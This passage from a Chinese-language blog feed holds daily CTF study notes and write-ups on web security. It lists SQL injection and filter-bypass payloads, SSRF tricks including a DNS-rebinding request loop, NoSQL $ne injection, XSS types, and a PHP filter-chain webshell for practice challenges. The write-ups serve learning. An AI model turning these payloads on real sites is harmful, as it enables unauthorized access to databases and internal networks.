alt="Image"></p><p>orange 做的神奇東西，在不同服務解析出來的結果不一樣<br><img data-src="https://i.imgur.com/qqfvEfU.png" alt="Image"></p></li></ul></li></ol><h3 id="lab---ssrf-1">Lab - ssrf 1 <a href="#lab---ssrf-1" class="headerlink"></a></h3><p>用之前介紹的方法，利用 <code>http://0</code> 會被當成<code>http://localhost</code> ，所以就可以成功存取內網 ip</p><figure><img data-src="https://i.imgur.com/jGfydVd.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---ssrf-2">Lab - ssrf 2 <a href="#lab---ssrf-2" class="headerlink"></a></h3><p>看他的程式碼知道網址的開頭要是 <code>httpbin.dev</code> ，去<code>https://httpbin.dev</code> 看看有什麼東西，發現了</p><figure><img data-src="https://i.imgur.com/Zm0JXIU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>於是只要使用<code>https://httpbin.dev/redirect-to?url=http://localhost/internal-only</code>就可以成功存取內網 ip 拿盪 flag 了</p><h3 id="lab---ssrf-3">Lab - ssrf 3 <a href="#lab---ssrf-3" class="headerlink"></a></h3><p>這提是用 DNS Rebinding的方式，但試了好幾次都沒成功，只好來寫個程式以量取勝</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://chall.nckuctf.org:28123/mkreq?url=http%3A%2F%2F7f000001.c0a80001.rbndr.us%2Finternal-only"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"NCKU"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p>然後跑一下下之後就拿到 flag 了</p><h3 id="front-end-security">Front-end Security <a href="#front-end-security" class="headerlink"></a></h3><p>除了 XSS 和 CSRF 之外，還有很多其他的酷東西</p><figure><img data-src="https://i.imgur.com/L8o8SWr.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><blockquote><p>網頁前端本身的限制，例如說不可能單純透過網頁讓你家的印表機列印東西，需要一個本地的伺服器，讓網頁去戳本地伺服器，再由本地伺服器去戳印表機</p></blockquote><p>So</p><figure><img data-src="https://i.imgur.com/ao7YNDA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RvwTkNK.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>這個 CVE 只要你點開一個網頁，你的小算盤就會跳出來</p><figure><img data-src="https://i.imgur.com/6oxMp54.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>或者是很多人用的 electron，背後其實也算是一個瀏覽器，也有可能被攻擊</p><h4 id="xss">XSS <a href="#xss" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/20CaJLG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Self-XSS: 只能攻擊自己的 XSS，但可能可以透過其他攻擊手法造成更嚴重的影響</p><figure><img data-src="https://i.imgur.com/Dp5Rdw5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Blind-XSS: XSS 在不知道甚麼時候可能會被觸發，例如當你把名字改成 XSSpayload</p><p>有個人把自己特斯拉的名字改成 XSS payload，有天車壞了拿去送修，結果剛好 XSS payload 被觸發，拿到 10000 USD 的 BugBounty</p><figure><img data-src="https://i.imgur.com/YeJOIpu.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/MyJkVIk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>分類</p><ol type="1"><li>Relfected XSS (Non-persistent XSS)<br><img data-src="https://i.imgur.com/YsfFT77.png" alt="Image"><br><img data-src="https://i.imgur.com/LPdmuv6.png" alt="Image"><br><img data-src="https://i.imgur.com/vDv01Cl.png" alt="Image"></li><li>Stored XSS (Persistent XSS)<br><img data-src="https://i.imgur.com/gHNMDqY.png" alt="Image"></li><li>DOM-based XSS<br><img data-src="https://i.imgur.com/LgsjI8p.png" alt="Image"></li></ol><p>常見 payload</p><p><img data-src="https://i.imgur.com/Py4uauU.png" alt="Image"><br><img data-src="https://i.imgur.com/NqehmvQ.png" alt="Image"><br><img data-src="https://i.imgur.com/zz3gOLj.png" alt="Image"><br><img data-src="https://i.imgur.com/5d5QwDo.png" alt="Image"></p><p>常見 payload - javascript 偽協議</p><figure><img data-src="https://i.imgur.com/Zcrcv4g.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>避免 <code>htmlescape</code></p><figure><img data-src="https://i.imgur.com/eszQLas.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/uxmNqn4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/b2RFaqC.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>因為 javascript 偽協議可以不包含任何雙引號，所以就可以繞過<code>htmlescape</code></p><p>常見 payload - innerHTML bitfall</p><p><img data-src="https://i.imgur.com/OJoDskQ.png" alt="Image"><br><img data-src="https://i.imgur.com/2ipNEu0.png" alt="Image"><br><img data-src="https://i.imgur.com/M2Q4HXC.png" alt="Image"><br><img data-src="https://i.imgur.com/44i3u6n.png" alt="Image"></p><p><a href="https://xss-game.appspot.com/">玩 XSS game~</a></p><h4 id="xss-worm">XSS worm <a href="#xss-worm" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/JMbinYv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="todo">TODO <a href="#todo" class="headerlink"></a></h3><p>搞懂那 XSS Lab 怎麼拿到 Flag</p><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV&quot;&gt;【成大資安社社課】不是 web3.0 的
web3 - 完&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day22</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day22/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day22/</id>
    <published>2024-09-24T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked="">7 題 web</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="第一題sql-direct">第一題：SQL Direct <a href="#第一題sql-direct" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/gdwtG9F.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>查了一下知道可以用 看看 table 的 schema，最後再用<code>select * from flags;</code> 看看 table 的內容</p><figure><img data-src="https://i.imgur.com/hG7qOvE.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第二題irish-name-repo-1">第二題：Irish-Name-Repo 1 <a href="#第二題irish-name-repo-1" class="headerlink"></a></h3><p>簡單的 SQL Injection，用 <code>' OR 1=1; # --</code> 輸入就可以了</p><figure><img data-src="https://i.imgur.com/lXfbGfJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第三題irish-name-repo-2">第三題：Irish-Name-Repo 2 <a href="#第三題irish-name-repo-2" class="headerlink"></a></h3><p>這題好像是會把 <code>OR</code> 過濾掉，所以試了一下之後只要用<code>admin'; -- #</code> 就可以了</p><figure><img data-src="https://i.imgur.com/uCvR9VP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第四題irish-name-repo-3">第四題：Irish-Name-Repo 3 <a href="#第四題irish-name-repo-3" class="headerlink"></a></h3><p>這題只有 password 可以輸入，試試看 <code>' OR 1=1; -- #</code>發現不行，想不到其他方法就開個 Burp Suite 看一下，發現他後面會自帶一個<code>&amp;debug=0</code> ，試試看改成 1 ，會發現他把 SQL query顯示出來了</p><figure><img data-src="https://i.imgur.com/snbplhQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>我發現他把 <code>OR</code> 變成 <code>BE</code> 了，似乎是<code>rot13</code> ，所以我把 <code>OR</code> 改成 <code>BE</code>，就成功得到 flag 了</p><figure><img data-src="https://i.imgur.com/FTfHNas.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第五題web-gauntlet">第五題：Web Gauntlet <a href="#第五題web-gauntlet" class="headerlink"></a></h3><h4 id="round-1">round 1 <a href="#round-1" class="headerlink"></a></h4><p>filter: <code>or</code><br>payload: <code>admin'; -- #</code></p><h4 id="round-2">round 2 <a href="#round-2" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>like</code>,<code>=</code>, <code>--</code><br>payload: <code>admin'; #</code></p><h4 id="round-3">round 3 <a href="#round-3" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code></p><p>但試了好久才她好像還擋了空白 OwO</p><p>payload: <code>admin';#</code></p><h4 id="round-4">round 4 <a href="#round-4" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code>, <code>admin</code></p><p>查了一下發現 <code>||</code> 可以把兩個字串連接起來，所以把<code>admin'</code> 改成 <code>ad'||'min'</code> 就可以了</p><p>payload: <code>ad'||'min';#</code></p><h4 id="round-5">round 5 <a href="#round-5" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code>, <code>union</code>, <code>admin</code></p><p>payload: <code>ad'||'min';#</code></p><p>然後到 filter.php 就可以看到 flag 了</p><figure><img data-src="https://i.imgur.com/Z5RkA1w.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第六題web-gauntlet-2">第六題：Web Gauntlet 2 <a href="#第六題web-gauntlet-2" class="headerlink"></a></h3><p>filter:<code>or and true false union like = &gt; &lt; ; -- /* */ admin</code></p><p>試了才發現好像 <code>#</code>根本沒有起到註解的用途，前面好像是放辛酸的，只好修改 password 使得 query成立，所以就把 password 設為 <code>a' is not 'b</code> 就可以了</p><p>payload: username <code>ad'||'min</code>, password<code>a' is not 'b</code></p><figure><img data-src="https://i.imgur.com/dZC96h4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第七題web-gauntlet-3">第七題：Web Gauntlet 3 <a href="#第七題web-gauntlet-3" class="headerlink"></a></h3><p>這題好像跟上一題一模一樣? 就把上提的 payload 照抄就過了</p><figure><img data-src="https://i.imgur.com/OvTrgIg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;7 題 web&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day21</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day21/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day21/</id>
    <published>2024-09-23T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - 到 SSRF</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="nosql-injection">NoSQL Injection <a href="#nosql-injection" class="headerlink"></a></h3><p>NoSQL = Not Only SQL</p><p>比較一下</p><figure><img data-src="https://i.imgur.com/ZYsqw9q.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>NoSQL 的特點: 不用提前定義 schema ，結構較靈活 ，更多的優點可以看 <a href="https://www.mongodb.com/nosql-explained/nosql-vs-sql">這裡</a></p><p>名詞上的定義比較</p><figure><img data-src="https://i.imgur.com/Dsv7wI0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>範例</p><figure><img data-src="https://i.imgur.com/E6kil0x.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/gTaY5Yx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>No SQL Injection 的精隨</p><figure><img data-src="https://i.imgur.com/1ajBcvD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>像是利用 <code>$ne</code> 表示不相等，因為 <code>xxx</code>跟真正的密碼不一樣，所以就會通關</p><figure><img data-src="https://i.imgur.com/xpYY8Bx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如果只回傳結果，不把細節跟你講，這樣就算成功登入，也不能知道真正的密碼</p><figure><img data-src="https://i.imgur.com/jhFMvgw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>可以用 regular expression 來迭代嘗試出結果，就跟我上次寫的<code>dig blind</code> 道理一樣</p><figure><img data-src="https://i.imgur.com/Lsb4yzt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---no-sql-injection">Lab - no-sql-injection <a href="#lab---no-sql-injection" class="headerlink"></a></h3><p>Lab 伺服器好像掛了 qaq ，之後再試</p><h3 id="lab---no-sql-injection-blind">Lab - no-sql-injection-blind <a href="#lab---no-sql-injection-blind" class="headerlink"></a></h3><p>好像也掛了 qaq ，之後再試</p><h3 id="ssrf-server-side-request-forgery">SSRF (Server-Side RequestForgery) <a href="#ssrf-server-side-request-forgery" class="headerlink"></a></h3><ul><li>伺服器端請求偽造 (Server-Side Request Forgery)</li><li>繞過防火牆，存取內網設備</li><li>多數資料庫、 mail server 等機敏設備會選擇架在內網</li></ul><h4 id="先回看-url-的定義-rfc3986">先回看 url 的定義 rfc3986 <a href="#先回看-url-的定義-rfc3986" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/ljodqkf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KUwmy1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>對於 scheme 的利用</p><ol type="1"><li>本地<br><img data-src="https://i.imgur.com/rEcHVqA.png" alt="Image"></li><li>php 偽協議<br><img data-src="https://i.imgur.com/9K9Ymzg.png" alt="Image"></li></ol><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV&quot;&gt;【成大資安社社課】不是 web3.0 的
web3 - 到 SSRF&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day20</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day20/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day20/</id>
    <published>2024-09-22T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2 - Lab</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="lab---swirl">Lab - swirl <a href="#lab---swirl" class="headerlink"></a></h3><h4 id="stage-1-2">stage 1 &amp; 2 <a href="#stage-1-2" class="headerlink"></a></h4><p>這兩題跟之前 Lab - phpisbest 差不多，只要在後面加上<code>/?A[]=[0]&amp;B[]=[3]</code> 就能達成各種 <code>null==null</code>就能過關了</p><h4 id="stage-3">stage 3 <a href="#stage-3" class="headerlink"></a></h4><p>這題我有觀察到可以 pathtraversal，但是我亂戳戳不到東西，過了大概十分鐘，又沒忍住點了一下 hint，才發現要戳的東西就是寫在原始碼裡面的 <code>config.php</code>，就能前往下一關了</p><figure><img data-src="https://i.imgur.com/xZD3Ha4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/nLS1RQl.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="stage-4">stage 4 <a href="#stage-4" class="headerlink"></a></h4><p>這題她沒有一個地方讀取 <code>👀</code> ，但有個<code>extract($_POST)</code> 可以利用 <code>POST</code> 的方式輸入<code>👀</code> ，之後就跟 <code>lfi2rce</code> 一樣，利用 <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php">phpfilter chain 構造出 webshell</a> ，就能得到 Flag 了</p><figure><img data-src="https://i.imgur.com/J7iMxyo.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/MBxcvve.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Note: 這邊要注意的是這個 webshell 指令最後需要的參數<code>1</code>，他是透過 <code>$_GET[1]</code>來取得的，所以要寫在網址後面解析，不是寫在 POST 裡面</p><h3 id="lab---fakelog">Lab - fakelog <a href="#lab---fakelog" class="headerlink"></a></h3><p>他很好心的給我們看了他生成的原始碼</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"no argument"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    magic_num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> sys.argv[<span class="number">1</span>].isdigit() <span class="keyword">else</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> magic_num == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"0 is not allowed"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">while</span> magic_num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f"fakelog/<span class="subst">{magic_num % <span class="number">6</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(magic_num, <span class="built_in">int</span>) <span class="keyword">else</span> magic_num}</span>"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">            <span class="built_in">print</span>(fd.read())</span><br><span class="line">        magic_num = <span class="number">3</span> * magic_num + <span class="number">1</span> <span class="keyword">if</span> magic_num % <span class="number">2</span> <span class="keyword">else</span> magic_num // <span class="number">2</span></span><br></pre></td></tr></tbody></table></figure><p>重點有兩個</p><ol type="1"><li><code>magic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]</code></li><li><code>with open(f"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}", "r", encoding="utf-8") as fd:</code></li></ol><p>他不會檢查 magic number是文字，而且在他是文字的時候他還會直接讓我們讀取檔案，所以我們可以利用這個漏洞來做path traversal</p><p>又可以從 Hint 的 dockerfile 中知道有個叫 <code>main.py</code>是主程式，拿出來看看</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> curl -sSL https://install.python-poetry.org | POETRY_HOME=/etc/poetry python3 - </span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pyproject.toml poetry.lock .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> /etc/poetry/bin/poetry config virtualenvs.create <span class="literal">false</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /etc/poetry/bin/poetry install</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">ARG</span> FLAG</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /app/flag_`<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">'a-zA-Z0-9'</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1`</span></span><br><span class="line"><span class="keyword">USER</span> daemon </span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">"python"</span>, <span class="string">"/app/main.py"</span>]</span></span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/D41SaaE.png" alt="Image"><figcaption 